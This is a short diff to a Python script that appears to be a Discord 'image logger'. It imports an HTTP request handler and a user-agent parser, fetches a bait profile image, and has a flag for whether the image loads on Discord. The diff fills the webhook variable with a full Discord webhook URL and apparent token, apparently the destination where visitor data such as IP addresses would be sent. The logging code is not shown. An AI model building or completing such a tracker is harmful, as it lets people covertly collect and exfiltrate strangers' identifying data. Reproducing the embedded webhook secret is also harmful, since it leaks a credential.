@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = ''
+webhook = 'https://discord.com/api/webhooks/1412460994680061962/Lr9R0WafZz8FRkCLtglMyIFWhivlnKRv9ao0R1pR04C_Qty--W1CQ42KocgN4a9Rnp8Z'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
